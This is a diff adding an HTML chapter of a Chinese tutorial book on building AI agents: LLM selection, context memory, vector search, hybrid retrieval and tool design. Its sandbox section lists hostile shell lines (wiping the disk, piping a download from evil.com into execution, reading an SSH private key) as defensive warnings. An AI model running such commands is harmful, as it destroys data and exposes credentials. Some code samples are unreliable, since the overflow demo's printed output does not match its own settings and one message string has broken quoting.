@@ -1,0 +1,1274 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="第3章：Agent 核心组件 | 《AGENT开发从入门到精通》">
+
+  <title>第3章：核心组件 | AGENT开发从入门到精通</title>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <!-- highlight.js for code blocks -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/[email protected]/styles/atom-one-dark.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/[email protected]/build/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+  <link rel="stylesheet" href="/assets/css/book.css">
+  <link rel="stylesheet" href="/assets/css/site.css">
+
+  <style>
+    :root {
+      --book-accent: linear-gradient(90deg, #c026d3, #f97316);
+      --book-accent-bg: rgba(192, 38, 211, 0.15);
+      --book-accent-fg: #c026d3;
+    }
+    .logo-icon {
+      background: var(--book-accent);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .chapter-content h2 {
+      border-left: 4px solid var(--book-accent-fg, #c026d3);
+      padding-left: 14px;
+    }
+    .chapter-content h3 {
+      color: var(--book-accent-fg, #c026d3);
+    }
+    .chapter-content a {
+      color: var(--book-accent-fg, #c026d3);
+    }
+    /* ch03 特定样式：四大件 SVG 示意 */
+    .four-pieces {
+      background: linear-gradient(135deg, rgba(192,38,211,0.08), rgba(249,115,22,0.08));
+      border: 1px solid rgba(192,38,211,0.3);
+      border-radius: 12px;
+      padding: 24px;
+      margin: 24px 0;
+      text-align: center;
+    }
+    .four-pieces svg {
+      max-width: 100%;
+      height: auto;
+    }
+    .four-pieces .piece-label {
+      fill: #f1f5f9;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 14px;
+      font-weight: 600;
+    }
+    .four-pieces .piece-sub {
+      fill: #94a3b8;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+    }
+    .four-pieces .arrow {
+      stroke: #c026d3;
+      stroke-width: 1.5;
+      fill: none;
+      marker-end: url(#arrowhead);
+    }
+  </style>
+</head>
+<body>
+  <!-- Reading Progress Bar -->
+  <div id="reading-progress"></div>
+
+  <!-- Particle Background -->
+  <canvas id="particle-canvas"></canvas>
+
+  <!-- ==================== HEADER ==================== -->
+  <header class="site-header">
+    <div class="header-inner">
+      <a href="../index.html" class="logo">
+        <div class="logo-icon">🤖</div>
+        <span>AGENT开发从入门到精通</span>
+      </a>
+
+      <!-- 站点级导航 -->
+      <nav class="site-nav" aria-label="站点导航">
+        <a href="../../index.html" class="site-nav-link site-nav-home" title="返回书库">
+          <span class="nav-icon">📚</span><span>书库</span>
+        </a>
+        <span class="site-nav-sep" aria-hidden="true">·</span>
+        <a href="../quantum-computing/index.html" class="site-nav-link" title="《量子计算》">量子计算</a>
+        <a href="../ml-intro/index.html" class="site-nav-link" title="《机器学习导论》">机器学习</a>
+        <a href="../information-theory/index.html" class="site-nav-link" title="《信息论基础》">信息论</a>
+        <a href="../index.html" class="site-nav-link active" title="《AGENT开发从入门到精通》">AGENT</a>
+      </nav>
+
+      <nav>
+        <ul class="nav-links" id="nav-links">
+          <li><a href="../index.html">首页</a></li>
+          <li><a href="../index.html#chapters">章节总览</a></li>
+          <li><a href="ch03.html" class="active">第3章</a></li>
+          <li><a href="../index.html#progress">阅读进度</a></li>
+        </ul>
+      </nav>
+
+      <div style="display:flex;align-items:center;gap:8px;">
+        <button class="theme-toggle" id="theme-toggle" aria-label="切换夜间模式">
+          <span class="theme-icon">☀️</span>
+        </button>
+        <button class="hamburger" id="hamburger" aria-label="菜单">
+          <span></span>
+          <span></span>
+          <span></span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- ==================== CHAPTER PAGE ==================== -->
+  <div class="chapter-page">
+    <div class="chapter-container">
+      <article class="chapter-content">
+
+        <header class="chapter-header">
+          <div class="chapter-breadcrumb">
+            <a href="../index.html">首页</a> / <a href="../index.html#chapters">章节总览</a> / 第3章
+          </div>
+          <h1>第 3 章 Agent 的核心组件——大脑、记忆、工具、规划</h1>
+          <div class="chapter-epigraph">
+            &ldquo;把一个 Agent 拆开看，里面其实就四样东西：一个会想问题的"大脑"（LLM）、一套"记忆"系统、一双能伸到外部世界的"手"（工具）、一个会拆任务的"项目经理"（规划）。这一章我们就把这四样东西拆开看，再拼起来做一个真正能跑的 Agent。&rdquo;
+          </div>
+        </header>
+
+        <!-- ===== 四大件 SVG 示意图 ===== -->
+        <div class="four-pieces">
+          <svg viewBox="0 0 600 320" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Agent 四大件示意图">
+            <defs>
+              <marker id="arrowhead" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto">
+                <polygon points="0 0, 8 4, 0 8" fill="#c026d3"/>
+              </marker>
+              <linearGradient id="brainGrad" x1="0%" y1="0%" x2="100%" y2="0%">
+                <stop offset="0%" stop-color="#c026d3"/>
+                <stop offset="100%" stop-color="#f97316"/>
+              </linearGradient>
+            </defs>
+
+            <!-- 中心 LLM 大脑 -->
+            <rect x="220" y="130" width="160" height="60" rx="12" fill="url(#brainGrad)" opacity="0.95"/>
+            <text x="300" y="160" text-anchor="middle" class="piece-label" fill="#fff">🧠 LLM 大脑</text>
+            <text x="300" y="180" text-anchor="middle" class="piece-sub" fill="#fff" opacity="0.9">思考 / 决策</text>
+
+            <!-- 记忆（左上） -->
+            <rect x="40" y="40" width="140" height="60" rx="10" fill="rgba(192,38,211,0.18)" stroke="#c026d3" stroke-width="1.5"/>
+            <text x="110" y="70" text-anchor="middle" class="piece-label">💾 记忆</text>
+            <text x="110" y="90" text-anchor="middle" class="piece-sub">短期 / 长期 / 知识图谱</text>
+            <line class="arrow" x1="180" y1="80" x2="220" y2="150"/>
+
+            <!-- 工具（右上） -->
+            <rect x="420" y="40" width="140" height="60" rx="10" fill="rgba(249,115,22,0.18)" stroke="#f97316" stroke-width="1.5"/>
+            <text x="490" y="70" text-anchor="middle" class="piece-label">🛠 工具</text>
+            <text x="490" y="90" text-anchor="middle" class="piece-sub">Function / API / Search</text>
+            <line class="arrow" x1="420" y1="80" x2="380" y2="150"/>
+
+            <!-- 规划（左下） -->
+            <rect x="40" y="220" width="140" height="60" rx="10" fill="rgba(192,38,211,0.18)" stroke="#c026d3" stroke-width="1.5"/>
+            <text x="110" y="250" text-anchor="middle" class="piece-label">📋 规划</text>
+            <text x="110" y="270" text-anchor="middle" class="piece-sub">Plan / ReAct / Reflexion</text>
+            <line class="arrow" x1="180" y1="240" x2="220" y2="180"/>
+
+            <!-- 工具调用反馈（右下） -->
+            <rect x="420" y="220" width="140" height="60" rx="10" fill="rgba(249,115,22,0.18)" stroke="#f97316" stroke-width="1.5"/>
+            <text x="490" y="250" text-anchor="middle" class="piece-label">📨 外部世界</text>
+            <text x="490" y="270" text-anchor="middle" class="piece-sub">Email / DB / Web / OS</text>
+            <line class="arrow" x1="420" y1="240" x2="380" y2="180"/>
+            <line class="arrow" x1="490" y1="220" x2="490" y2="100"/>
+          </svg>
+          <p style="margin-top:8px; color:#94a3b8; font-size:0.9em;">图 3.1 &nbsp; Agent 四大件协作关系 —— 大脑居中调度，记忆、工具、规划环绕。</p>
+        </div>
+
+          
+          <hr>
+          <h2 id="section-3.1">3.1 引子：拆开一个 Agent 看四件套</h2>
+          <p>第 1 章我们讲了"Agent 是什么"——一个能在数字世界里自主完成多步任务的 AI。第 2 章我们讲了"Agent 怎么来的"——60 年的三次浪潮和一群关键人物。</p>
+          <p>从本章开始，我们要回答一个更工程化的问题：<strong>一个 Agent 到底由什么组成？</strong></p>
+          <p>如果你去看 2024 年以后的任何主流 Agent 框架（LangGraph、AutoGen、CrewAI、Agno、OpenAI Agents SDK），把它们都拆开，里面都长这样：</p>
+          <pre><code class="language-text">        ┌──────────────────┐
+        │   LLM 大脑       │  ← 思考 / 决策 / 生成
+        └────────┬─────────┘
+                 │
+   ┌─────────────┼─────────────┐
+   ▼             ▼             ▼
+┌──────┐   ┌──────────┐   ┌──────────┐
+│ 记忆 │   │   工具    │   │  规划    │
+│Memory│   │  Tools   │   │ Planning │
+└──────┘   └──────────┘   └──────────┘</code></pre>
+          <p><strong>为什么是这四件？</strong></p>
+          <ul>
+          <li><strong>大脑</strong>：Agent 的"思考者"。没有 LLM，就没有"智能"。</li>
+          <li><strong>记忆</strong>：Agent 的"笔记本"。没有记忆，Agent 就是金鱼——7 步前说过啥完全不记得。</li>
+          <li><strong>工具</strong>：Agent 的"手和脚"。LLM 本身不能发邮件、查天气、读写文件——这些都得靠工具。</li>
+          <li><strong>规划</strong>：Agent 的"项目经理"。面对"订机票 + 订酒店 + 安排接机"这种多步任务，得先拆、再做、再检查。</li>
+          </ul>
+          <p>少了任何一件，Agent 都做不成真正的多步任务。这一章我们用 9 节讲完四件套，最后在 3.8 拼一个完整可跑的 Agent。</p>
+          <p><strong>全章路线图</strong>：</p>
+          <table>
+          <thead><tr><th>节号</th><th>主题</th><th>核心问题</th></tr></thead>
+          <tbody>
+          <tr><td>3.2</td><td>LLM 大脑</td><td>选哪个模型？参数怎么调？</td></tr>
+          <tr><td>3.3</td><td>短期记忆</td><td>context window 满了怎么办？</td></tr>
+          <tr><td>3.4</td><td>长期记忆</td><td>怎么让 Agent 记 1 年前的事？</td></tr>
+          <tr><td>3.5</td><td>工具</td><td>怎么给 Agent 装"手"？</td></tr>
+          <tr><td>3.6</td><td>规划</td><td>怎么让 Agent 拆任务？</td></tr>
+          <tr><td>3.7</td><td>协议层</td><td>Function Calling 是怎么工作的？</td></tr>
+          <tr><td>3.8</td><td>拼起来</td><td>写一个完整 Agent</td></tr>
+          <tr><td>3.9</td><td>进阶</td><td>让它跑得更稳</td></tr>
+          <tr><td>3.10</td><td>现状</td><td>2026 年的最佳实践</td></tr>
+          </tbody>
+          </table>
+          <hr>
+          <h2 id="section-3.2">3.2 LLM 大脑——Agent 的"思考中枢"</h2>
+          <p>LLM 是 Agent 唯一会"想问题"的部件。<strong>没有 LLM，Agent 就是个空壳</strong>。</p>
+          <h3>3.2.1 模型选型：通用 / 推理 / 开源</h3>
+          <p>2026 年的 LLM 市场大致分三类：</p>
+          <table>
+          <thead><tr><th>类型</th><th>代表</th><th>优势</th><th>劣势</th><th>适用场景</th></tr></thead>
+          <tbody>
+          <tr><td><strong>通用闭源</strong></td><td>GPT-4o / Claude Sonnet 4 / Gemini 2.5 Pro</td><td>综合能力强、工具调用稳定</td><td>贵、数据出云</td><td>大多数 Agent 任务</td></tr>
+          <tr><td><strong>推理模型</strong></td><td>OpenAI o3 / Claude Opus 4 (with thinking) / DeepSeek-R1</td><td>数学、代码、规划强</td><td>慢、贵、token 消耗大</td><td>复杂多步推理</td></tr>
+          <tr><td><strong>开源可自部署</strong></td><td>Llama 3.3 70B / Qwen 2.5 72B / Mistral Large 2</td><td>数据不出云、可微调</td><td>弱 30-50%、运维成本</td><td>隐私敏感场景</td></tr>
+          </tbody>
+          </table>
+          <p><strong>经验法则</strong>：</p>
+          <ul>
+          <li>80% 的 Agent 任务用<strong>通用闭源</strong>（Claude Sonnet 4 或 GPT-4o）就够。</li>
+          <li>任务涉及<strong>复杂规划</strong>（如 5 步以上推理、代码生成），加一个<strong>推理模型</strong>当"项目经理"。</li>
+          <li><strong>金融、医疗、政务</strong>这类强合规场景，优先<strong>开源 + 私有部署</strong>。</li>
+          </ul>
+          <h3>3.2.2 关键参数</h3>
+          <pre><code class="language-python">import openai
+
+response = openai.chat.completions.create(
+    model="gpt-4o",           # 选哪个模型
+    temperature=0.0,          # 创造性：0=确定，1=随机
+    top_p=1.0,                # nucleus sampling（一般不动）
+    max_tokens=2048,          # 最多生成多少 token
+    frequency_penalty=0.0,    # 重复惩罚
+    presence_penalty=0.0,     # 新话题奖励
+    stop=["\n\n\n"],          # 停止符
+)</code></pre>
+          <p><strong>Agent 场景下的推荐值</strong>：</p>
+          <table>
+          <thead><tr><th>参数</th><th>推荐值</th><th>为什么</th></tr></thead>
+          <tbody>
+          <tr><td><code>temperature</code></td><td><strong>0.0 - 0.3</strong></td><td>工具调用要稳定，别让模型"发挥"</td></tr>
+          <tr><td><code>top_p</code></td><td>1.0（默认）</td><td>Agent 不需要截断采样</td></tr>
+          <tr><td><code>max_tokens</code></td><td><strong>2048 - 4096</strong></td><td>大多数 Agent 单次响应 1-2K token 够</td></tr>
+          <tr><td><code>frequency_penalty</code></td><td>0.0</td><td>Agent 重复调用是合理的</td></tr>
+          <tr><td><code>stop</code></td><td>视任务定</td><td>比如工具调用后用 <code>\nObservation:</code> 停</td></tr>
+          </tbody>
+          </table>
+          <h3>3.2.3 Context Window 的演进</h3>
+          <p>Context window 决定了 Agent 的"短期记忆容量"：</p>
+          <table>
+          <thead><tr><th>时间</th><th>代表模型</th><th>Context</th><th>价格趋势</th></tr></thead>
+          <tbody>
+          <tr><td>2022</td><td>GPT-3.5</td><td>4K</td><td>贵</td></tr>
+          <tr><td>2023</td><td>GPT-4 8K / 32K</td><td>8K - 32K</td><td>贵</td></tr>
+          <tr><td>2024</td><td>Claude 3.5 Sonnet</td><td>200K</td><td>中</td></tr>
+          <tr><td>2025</td><td>Gemini 2.5 Pro</td><td>1M（1.5 Pro 起支持 2M）</td><td>低</td></tr>
+          <tr><td>2026</td><td>Claude Sonnet 4.5</td><td>1M</td><td>中</td></tr>
+          </tbody>
+          </table>
+          <p><strong>注意</strong>：context 越大，单次请求的<strong>成本和延迟</strong>都线性甚至超线性增长。不要无脑选 1M——<strong>够用就好</strong>。</p>
+          <hr>
+          <h2 id="section-3.3">3.3 短期记忆——Context Window</h2>
+          <p>短期记忆就是<strong>当前对话的 context window</strong>。模型能看到的所有东西（系统提示 + 历史消息 + 工具调用结果）都装在这里。</p>
+          <h3>3.3.1 Context Window 的本质</h3>
+          <pre><code class="language-python"># 一个完整的 context 长这样
+context = [
+    {"role": "system", "content": "你是一个助理，能查天气。"},     # 系统提示
+    {"role": "user", "content": "今天北京天气如何？"},              # 用户问题
+    {"role": "assistant", "content": None,                         # Agent 决策
+     "tool_calls": [{"function": {"name": "get_weather",
+                                   "arguments": "{\"city\": \"北京\"}"}}]},
+    {"role": "tool", "content": "{\"temp\": 25, "condition": "晴"}"}, # 工具返回
+    {"role": "assistant", "content": "今天北京 25 度，晴天。"},     # Agent 回答
+    {"role": "user", "content": "那明天呢？"},                      # 追问
+    # ... 越来越多
+]</code></pre>
+          <p><strong>问题</strong>：context 不是无限的。满了会怎样？</p>
+          <h3>3.3.2 Context Overflow 演示</h3>
+          <p>我们用 100 行 Python 模拟一下：</p>
+          <pre><code class="language-python"># context_overflow_demo.py
+# 模拟 context 满了之后会发生什么
+
+MAX_CONTEXT = 10  # 简化：只装 10 条消息
+
+class SimpleAgent:
+    def __init__(self, max_context=MAX_CONTEXT):
+        self.max_context = max_context
+        self.history = [
+            {"role": "system", "content": "你是一个聊天 Agent。"}
+        ]
+
+    def add_message(self, msg):
+        self.history.append(msg)
+        # 关键：超出容量就丢最早的
+        if len(self.history) &gt; self.max_context:
+            dropped = self.history[1]   # 永远保留 system
+            self.history = [self.history[0]] + self.history[2:]
+            print(f"  [警告] 丢弃消息: {dropped['role']} - {dropped['content'][:30]}")
+
+    def reply(self, user_msg):
+        self.add_message({"role": "user", "content": user_msg})
+        # 假装是模型回答
+        return f"我看到了 {len(self.history)-1} 条历史消息"
+
+agent = SimpleAgent(max_context=4)
+print(f"=== 模拟 context overflow（max={MAX_CONTEXT}）===")
+for i in range(8):
+    user_msg = f"消息 {i+1}"
+    print(f"用户: {user_msg}")
+    reply = agent.reply(user_msg)
+    print(f"Agent: {reply}\n")</code></pre>
+          <p>跑一下：</p>
+          <pre><code class="language-text">=== 模拟 context overflow（max=10）===
+用户: 消息 1
+Agent: 我看到了 1 条历史消息
+
+用户: 消息 2
+Agent: 我看到了 2 条历史消息
+
+...（前 8 条都不丢）...
+
+用户: 消息 9
+Agent: 我看到了 9 条历史消息
+  [警告] 丢弃消息: user - 消息 1</code></pre>
+          <p><strong>核心结论</strong>：context 满了，最早的消息会被丢。<strong>这意味着 Agent 会"忘记"很久以前说过的话</strong>。</p>
+          <h3>3.3.3 三种应对策略</h3>
+          <table>
+          <thead><tr><th>策略</th><th>怎么做</th><th>优点</th><th>缺点</th></tr></thead>
+          <tbody>
+          <tr><td><strong>滑动窗口</strong></td><td>丢最早的 K 条</td><td>简单</td><td>早期重要信息丢失</td></tr>
+          <tr><td><strong>摘要压缩</strong></td><td>让 LLM 把历史压缩成 200 字</td><td>保留语义</td><td>慢、贵、可能丢细节</td></tr>
+          <tr><td><strong>分层缓存</strong></td><td>system + 关键事实 + 滑动窗口</td><td>平衡</td><td>实现复杂</td></tr>
+          </tbody>
+          </table>
+          <p><strong>2026 最佳实践</strong>：<strong>滑动窗口 + 关键事实外提</strong>。把用户的名字、偏好、任务目标提取到 system prompt 里，滑动窗口只放近期对话。</p>
+          <h3>3.3.4 上下文压缩：4 种方法</h3>
+          <p>滑动窗口会丢早期信息。要"丢而不漏"，需要压缩。常见 4 种方法：</p>
+          <table>
+          <thead><tr><th>方法</th><th>思路</th><th>优点</th><th>缺点</th></tr></thead>
+          <tbody>
+          <tr><td><strong>截断（Truncation）</strong></td><td>只保留最近 N 条</td><td>快</td><td>早期全丢</td></tr>
+          <tr><td><strong>摘要（Summarization）</strong></td><td>让 LLM 把历史压成 200 字</td><td>保留语义</td><td>慢、贵、可能丢细节</td></tr>
+          <tr><td><strong>抽取（Extraction）</strong></td><td>让 LLM 抽"用户偏好"等关键事实</td><td>精确</td><td>需要写好 prompt</td></tr>
+          <tr><td><strong>分层（Hierarchical）</strong></td><td>全局摘要 + 近期原文</td><td>平衡</td><td>实现复杂</td></tr>
+          </tbody>
+          </table>
+          <p><strong>生产推荐</strong>：<strong>摘要 + 抽取 + 滑动窗口</strong>组合——摘要压缩中间历史，抽取保留关键事实，滑动窗口保留最近 3-5 轮原文。</p>
+          <pre><code class="language-python"># context_compressor.py
+# 演示摘要 + 抽取组合
+# 离线 mock LLM
+
+def mock_summarize(messages):
+    """模拟 LLM 摘要。"""
+    user_msgs = [m["content"] for m in messages if m.get("role") == "user"]
+    return f"用户共提了 {len(user_msgs)} 个问题，主要关注 {user_msgs[0][:10] if user_msgs else '未知'}。"
+
+def mock_extract(messages):
+    """模拟 LLM 抽关键事实。"""
+    facts = []
+    for m in messages:
+        if m.get("role") == "user":
+            # 简化：抽取"我 X" 模式
+            if "我喜欢" in m["content"] or "我要" in m["content"]:
+                facts.append(m["content"])
+    return facts
+
+# 压缩策略
+def compress_history(history, keep_recent=4):
+    if len(history) &lt;= keep_recent + 1:  # system + 少量
+        return history
+    # 1. system 提示保留
+    system = history[0]
+    # 2. 最近 N 条原文保留
+    recent = history[-keep_recent:]
+    # 3. 中间部分压缩
+    middle = history[1:-keep_recent]
+    summary = mock_summarize(middle)
+    facts = mock_extract(middle)
+    # 4. 拼回去
+    return [
+        system,
+        {"role": "system", "content": f"[历史摘要] {summary}"},
+        {"role": "system", "content": f"[关键事实] {'; '.join(facts) if facts else '无'}"},
+        *recent
+    ]
+
+# 演示
+history = [
+    {"role": "system", "content": "你是一个助理。"},
+    {"role": "user", "content": "我喜欢科幻小说"},
+    {"role": "assistant", "content": "好的，记下了"},
+    {"role": "user", "content": "今天天气怎么样"},
+    {"role": "assistant", "content": "晴，25 度"},
+    {"role": "user", "content": "明天呢"},
+    {"role": "assistant", "content": "多云"},
+    {"role": "user", "content": "适合去哪玩"},
+    {"role": "assistant", "content": "推荐公园"},
+]
+compressed = compress_history(history, keep_recent=4)
+print(f"原 {len(history)} 条 → 压 {len(compressed)} 条")
+for m in compressed:
+    print(f"  {m['role']}: {m['content'][:50]}")</code></pre>
+          <p>跑一下可以看到：原 9 条消息被压到 6 条，但保留了 system 提示、关键事实（"我喜欢科幻小说"）、最近 4 条原文。</p>
+          <hr>
+          <h2 id="section-3.4">3.4 长期记忆——向量数据库 + 知识图谱</h2>
+          <p>短期记忆装不下的东西（"1 年前用户说过啥"），就要进<strong>长期记忆</strong>。</p>
+          <h3>3.4.1 Embedding：把文字变成数字</h3>
+          <p>LLM 读的是 token，向量数据库存的是<strong>数字向量</strong>。</p>
+          <pre><code class="language-python"># embed_demo.py
+# 用 sentence-transformers 把句子变成向量
+# pip install sentence-transformers numpy
+# 小贴士：bge-small-zh-v1.5 包体 ~100MB，笔记本也能跑；不要用 bge-large-zh-v1.5（~1.5GB）
+
+from sentence_transformers import SentenceTransformer
+import numpy as np
+
+model = SentenceTransformer('BAAI/bge-small-zh-v1.5')  # 中文友好
+
+sentences = [
+    "北京今天晴，25 度",
+    "上海今天多云，28 度",
+    "北京明天有雨",
+]
+
+embeddings = model.encode(sentences)
+print(f"向量维度: {embeddings.shape}")  # (3, 512)
+print(f"第 0 条向量前 5 个数: {embeddings[0][:5]}")
+
+# 计算相似度（cosine）
+def cosine(a, b):
+    return np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b))
+
+print(f"'北京今天晴' vs '北京明天有雨': {cosine(embeddings[0], embeddings[2]):.3f}")
+print(f"'北京今天晴' vs '上海今天多云': {cosine(embeddings[0], embeddings[1]):.3f}")
+# 输出 0.85+ vs 0.6+ — 同一城市相似度更高</code></pre>
+          <p><strong>关键事实</strong>：</p>
+          <ul>
+          <li>语义相近的句子，向量距离近</li>
+          <li>北京的两条 vs 北京/上海，相似度差异显著</li>
+          <li>这就是"语义检索"的基础</li>
+          </ul>
+          <h3>3.4.2 向量数据库选型</h3>
+          <table>
+          <thead><tr><th>库</th><th>类型</th><th>适用规模</th><th>特点</th></tr></thead>
+          <tbody>
+          <tr><td><strong>Chroma</strong></td><td>嵌入式</td><td>10K - 1M</td><td>开箱即用，适合 demo 和小项目</td></tr>
+          <tr><td><strong>pgvector</strong></td><td>Postgres 扩展</td><td>1M - 100M</td><td>复用 PG 生态，事务支持好</td></tr>
+          <tr><td><strong>Pinecone</strong></td><td>SaaS</td><td>100M+</td><td>全托管，贵</td></tr>
+          <tr><td><strong>Weaviate</strong></td><td>自部署</td><td>10M+</td><td>混合检索强</td></tr>
+          <tr><td><strong>Milvus</strong></td><td>自部署</td><td>100M+</td><td>国产、性能强</td></tr>
+          <tr><td><strong>Qdrant</strong></td><td>自部署</td><td>10M+</td><td>Rust 写的、快</td></tr>
+          </tbody>
+          </table>
+          <p><strong>2026 选择建议</strong>：</p>
+          <ul>
+          <li><strong>个人项目 / 原型</strong>：Chroma</li>
+          <li><strong>生产 + 已有 PG</strong>：pgvector</li>
+          <li><strong>生产 + 数据量大</strong>：Qdrant 或 Milvus</li>
+          <li><strong>不想运维</strong>：Pinecone</li>
+          </ul>
+          <h3>3.4.3 知识图谱：另一种长期记忆</h3>
+          <p>向量数据库擅长"语义相似"检索，<strong>不擅长"实体关系"推理</strong>。比如：</p>
+          <ul>
+          <li>"用户 A 是公司 B 的 CEO"</li>
+          <li>"公司 B 收购了公司 C"</li>
+          <li>"用户 A 喜欢用户 D"</li>
+          </ul>
+          <p>这些"关系链"用向量检索会丢失。<strong>知识图谱</strong>就是为这种场景设计的。</p>
+          <pre><code class="language-cypher">// Neo4j Cypher 查询
+MATCH (u:User {name: "张三"})-[:CEO_OF]-&gt;(c:Company)-[:ACQUIRED]-&gt;(target)
+RETURN target.name</code></pre>
+          <p>2025 年起流行的 <strong>GraphRAG</strong>（微软）就是用 LLM 自动从文本里抽实体关系，建图，再做 RAG。这是 3.4 的进阶话题，留到第 9 章再展开。</p>
+          <h3>3.4.4 混合检索：向量 + 关键词</h3>
+          <p>纯向量检索有一个问题——<strong>对专有名词、ID、缩写不敏感</strong>。比如用户搜"Q3 财报"，向量检索可能匹配到"季度报告"，但匹配不到"Q3"。</p>
+          <p>生产环境一般用<strong>混合检索</strong>（hybrid retrieval）：</p>
+          <pre><code class="language-python"># hybrid_retrieval.py
+# 向量检索 + BM25 关键词检索 + 倒数排名融合（RRF）
+# pip install rank-bm25 sentence-transformers numpy
+
+from rank_bm25 import BM25Okapi
+from sentence_transformers import SentenceTransformer
+import numpy as np
+
+class HybridRetriever:
+    def __init__(self, docs):
+        self.docs = docs
+        # 1. BM25 关键词索引
+        tokenized = [self._tokenize(d) for d in docs]
+        self.bm25 = BM25Okapi(tokenized)
+        # 2. 向量索引
+        self.embedder = SentenceTransformer('BAAI/bge-small-zh-v1.5')
+        self.doc_embeds = self.embedder.encode(docs)
+
+    @staticmethod
+    def _tokenize(text):
+        # 简化版中文分词（生产环境用 jieba）
+        return list(text)
+
+    def search(self, query, top_k=3, alpha=0.5):
+        """alpha 控制向量 vs 关键词的权重。"""
+        # 1. BM25 分数
+        bm25_scores = self.bm25.get_scores(self._tokenize(query))
+        # 2. 向量相似度
+        q_embed = self.embedder.encode([query])[0]
+        vec_scores = np.dot(self.doc_embeds, q_embed) / (
+            np.linalg.norm(self.doc_embeds, axis=1) * np.linalg.norm(q_embed)
+        )
+        # 3. 加权融合
+        combined = alpha * vec_scores + (1 - alpha) * bm25_scores
+        top_idx = np.argsort(combined)[::-1][:top_k]
+        return [(self.docs[i], combined[i]) for i in top_idx]
+
+# 演示
+docs = [
+    "Q3 财报营收增长 30%",
+    "第三季度公司收入大幅提升",
+    "iPhone 15 Pro Max 评测",
+]
+r = HybridRetriever(docs)
+print(r.search("Q3 财报", top_k=2))
+# 第一条 "Q3 财报" 排第一（BM25 命中关键词 + 向量相似）</code></pre>
+          <p><strong>RRF（Reciprocal Rank Fusion）</strong> 是更高级的融合方式——不直接加权分数，而是把两路排序的"倒数排名"加起来。Qdrant / Weaviate / Milvus 都内置了 RRF。</p>
+          <hr>
+          <h2 id="section-3.5">3.5 工具——Agent 的"手和脚"</h2>
+          <p>LLM 本质是个<strong>只输出文字</strong>的程序。它不能发邮件、查天气、操作文件——这些都得靠<strong>工具</strong>。</p>
+          <h3>3.5.1 工具的三大类</h3>
+          <table>
+          <thead><tr><th>类型</th><th>例子</th><th>谁来执行</th></tr></thead>
+          <tbody>
+          <tr><td><strong>内置</strong></td><td><code>web_search</code>、<code>code_interpreter</code></td><td>模型供应商</td></tr>
+          <tr><td><strong>外部 API</strong></td><td><code>get_weather(city)</code>、<code>send_email(to, subject)</code></td><td>你的服务器</td></tr>
+          <tr><td><strong>自定义</strong></td><td><code>query_database(sql)</code>、<code>read_file(path)</code></td><td>你的代码</td></tr>
+          </tbody>
+          </table>
+          <p><strong>注意</strong>：内置工具（web_search）虽然好用，但<strong>内容不可控</strong>。生产环境一般用自定义工具 + 自己的 RAG 流水线。</p>
+          <h3>3.5.2 工具描述的 4 个要点</h3>
+          <p>每个工具要清楚地告诉 LLM：</p>
+          <pre><code class="language-json">{
+  "name": "get_weather",                          // 1. 名字（动词开头）
+  "description": "查询指定城市的当前天气",        // 2. 做什么、何时用
+  "parameters": {                                 // 3. 参数（JSON Schema）
+    "type": "object",
+    "properties": {
+      "city": {
+        "type": "string",
+        "description": "城市名，如 '北京'"
+      }
+    },
+    "required": ["city"]
+  },
+  "returns": {                                    // 4. 返回结构
+    "type": "object",
+    "properties": {
+      "temp": {"type": "number"},
+      "condition": {"type": "string"}
+    }
+  }
+}</code></pre>
+          <p><strong>关键</strong>：</p>
+          <ul>
+          <li><strong><code>description</code> 决定 LLM 是否会选这个工具</strong>。写得不清，再好的工具也没人用。</li>
+          <li><strong><code>parameters.description</code> 决定 LLM 怎么填参数</strong>。比如 <code>city</code> 要不要带"市"字、温度单位用摄氏度还是华氏度——都得说清。</li>
+          <li><strong>不要把 50 个工具塞给 Agent</strong>。工具越多，模型选错的概率越大。<strong>单次 prompt 不超过 10-15 个工具</strong>。</li>
+          </ul>
+          <h3>3.5.3 安全沙箱</h3>
+          <p><strong>绝对不要</strong>给 Agent 系统的 shell 权限。Agent 拿到 shell 能干什么？</p>
+          <pre><code class="language-bash">rm -rf /              # 删库
+curl evil.com|x       # 远程执行
+cat ~/.ssh/id_rsa      # 偷私钥</code></pre>
+          <p><strong>正确做法</strong>：</p>
+          <ol>
+          <li><strong>白名单工具</strong>：只暴露你写好的工具函数</li>
+          <li><strong>超时 + 重试</strong>：每个工具调用限时 30s</li>
+          <li><strong>资源配额</strong>：单次任务最多调用 10 个工具</li>
+          <li><strong>审计日志</strong>：所有工具调用记到 log，方便事后追查</li>
+          </ol>
+          <h3>3.5.4 工具错误处理：4 类常见错误</h3>
+          <p>工具调用失败时，Agent 看到的"错误"分四种，处理方式也不同：</p>
+          <table>
+          <thead><tr><th>错误类型</th><th>例子</th><th>应对</th></tr></thead>
+          <tbody>
+          <tr><td><strong>参数错误</strong></td><td><code>get_weather(city=)</code> 缺 city</td><td>反馈给 LLM，让它重填</td></tr>
+          <tr><td><strong>网络错误</strong></td><td>HTTP 500 / 超时</td><td>重试 1-2 次，失败后换工具</td></tr>
+          <tr><td><strong>业务错误</strong></td><td>"用户余额不足"</td><td>把业务错误传回 LLM，让它换方案</td></tr>
+          <tr><td><strong>权限错误</strong></td><td>401 / 403</td><td>立即停止任务，提示用户</td></tr>
+          </tbody>
+          </table>
+          <pre><code class="language-python"># tool_error_handler.py
+# 工具错误分类 + 重试逻辑
+
+import time
+import random
+
+def execute_tool_with_retry(name, func, args, max_attempts=3):
+    """带重试 + 错误分类的工具执行。"""
+    last_error = None
+    for attempt in range(max_attempts):
+        try:
+            return {"ok": True, "result": func(**args)}
